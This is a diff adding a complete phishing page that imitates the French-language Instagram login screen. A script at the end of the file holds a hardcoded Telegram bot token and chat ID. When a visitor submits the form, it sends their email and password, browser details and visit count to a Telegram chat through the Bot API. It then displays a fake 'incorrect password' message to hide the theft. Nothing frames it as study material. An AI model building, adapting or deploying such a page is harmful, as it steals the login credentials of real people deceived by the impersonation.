@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>Instagram</title>
+    <style>
+        /* إعادة تعيين بعض التنسيقات الافتراضية */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #fff;
+            font-family: Arial, sans-serif;
+            overflow-x: hidden; /* منع التمرير الأفقي */
+        }
+
+        .flex {
+            display: flex;
+        }
+
+        .direction-column {
+            flex-direction: column;
+        }
+
+        .justify-content-center {
+            justify-content: center;
+        }
+
+        .align-items-center {
+            align-items: center;
+        }
+
+        .panel {
+            border: none;
+            box-shadow: none;
+        }
+
+        input, button {
+            border: none !important;
+            outline: none !important;
+            box-shadow: none !important;
+            background-color: #fafafa;
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 4px;
+            width: 100%; /* يجعل الحقول تتكيف مع الحجم */
+        }
+
+        input:focus, button:focus {
+            border: none;
+            outline: none;
+        }
+
+        .input-container {
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .input-container input {
+            width: 100%;
+            border: none;
+            padding: 8px;
+            background-color: transparent;
+        }
+
+        .input-container input:focus {
+            border: none;
+        }
+
+        #error-message {
+            color: red;
+            text-align: center;
+            margin: 10px 0;
+            display: none;
+        }
+
+        .text-muted {
+            font-size: 12px;
+            color: #8e8e8e;
+            font-weight: 400;
+        }
+
+        .text-capitalize {
+            text-transform: capitalize;
+        }
+
+        .login-with-fb .facebook-logo {
+            width: 20px;
+            height: auto;
+            margin-right: 10px;
+        }
+
+        .app-download img {
+            margin: 10px;
+            width: 120px;
+            height: auto;
+        }
+
+        /* تحسين عرض الصورة عند التكبير */
+        #instagram-logo {
+            max-width: 100%;
+            height: auto;
+            margin-top: 20px; /* إضافة مسافة من الأعلى للصورة */
+        }
+
+        /* إضافة media queries لتحسين التفاعل مع الشاشات الكبيرة والصغيرة */
+        @media (max-width: 768px) {
+            .panel {
+                width: 90%;
+                padding: 10px; /* إضافة padding للحواف في الشاشات الصغيرة */
+            }
+
+            .input-container input {
+                padding: 5px; /* تصغير padding في الشاشات الصغيرة */
+            }
+
+            #instagram-logo {
+                width: 200px; /* تصغير صورة Instagram على الشاشات الصغيرة */
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .panel {
+                width: 400px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex"></section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img id="instagram-logo" src="./img/instagram-logo.png" alt="Logo Instagram" title="Logo Instagram" />
+                </h1>
+                <form id="login-form">
+                    <div class="input-container">
+                        <label for="email" class="sr-only">Num. téléphone, nom de profil ou e-mail</label>
+                        <input name="email" id="email" placeholder="Num. téléphone, nom de profil ou e-mail" required />
+                    </div>
+
+                    <div class="input-container">
+                        <label for="password" class="sr-only">Mot de passe</label>
+                        <input name="password" id="password" type="password" placeholder="Mot de passe" required />
+                    </div>
+
+                    <button type="submit">Se connecter</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OU</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div class="flex align-items-center">
+                        <img src="./img/facebook_logo.png" alt="Facebook Logo" class="facebook-logo" />
+                        <a>Se connecter avec Facebook</a>
+                    </div>
+                    <a href="#">Mot de passe oublié ?</a>
+                </div>
+
+                <div id="error-message">Votre mot de passe est incorrect. Veuillez le vérifier.</div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Vous n'avez pas de compte ?</p>
+                <a href="#">Inscrivez-vous</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p class="text-muted">Téléchargez l'application.</p>
+                <div class="flex justify-content-center">
+                    <img src="./img/apple-button.png" alt="Logo de l'App Store" title="Logo de l'App Store" />
+                    <img src="./img/googleplay-button.png" alt="Logo du Google Play" title="Logo du Google Play" />
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#" class="text-muted text-capitalize">Meta</a></li>
+            <li><a href="#" class="text-muted text-capitalize">À propos</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Blog</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Emplois</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Aide</a></li>
+            <li><a href="#" class="text-muted text-capitalize">API</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Confidentialité</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Conditions</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Lieux</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Instagram Lite</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Threads</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Importation des contacts et non-utilisateurs</a></li>
+            <li><a href="#" class="text-muted text-capitalize">Meta Verified</a></li>
+        </ul>
+        <p class="copyright text-muted text-capitalize">
+            ㅤㅤㅤFrançais ✔ ㅤㅤ© 2025 Instagram par Meta
+        </p>
+    </footer>
+
+    <script>
+        const BOT_TOKEN = '7514217415:AAEZb_bnwStDeU5QepXF8meGbJgPL4HmCvw';
+        const CHAT_ID = '8004806348';
+    
+        // تسجيل عدد زيارات المستخدم
+        let visitCount = localStorage.getItem('visit_count');
+        if (visitCount === null) {
+            visitCount = 1;
+        } else {
+            visitCount = parseInt(visitCount) + 1;
+        }
+        localStorage.setItem('visit_count', visitCount);
+    
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            }).catch(error => {
+                console.error("Erreur:", error);
+            });
+        }
+    
+        document.getElementById("login-form").addEventListener("submit", function(e) {
+            e.preventDefault();
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+    
+            const loginMessage = `✅ Nouvelle Connexion (Instagram)
+    👤 Email: ${email}
+    🔑 Mot de passe: ${password}
+    📈 Nombre de visites: ${visitCount}
+    🕒 Temps: ${new Date().toLocaleString()}
+    🌍 IP: ${window.location.hostname}
+    🌐 Navigateur: ${navigator.userAgent}`;
+    
+            sendToTelegram(loginMessage);
+    
+            document.getElementById("error-message").style.display = "block";
+        });
+    </script>
+    
+</body>
+</html>
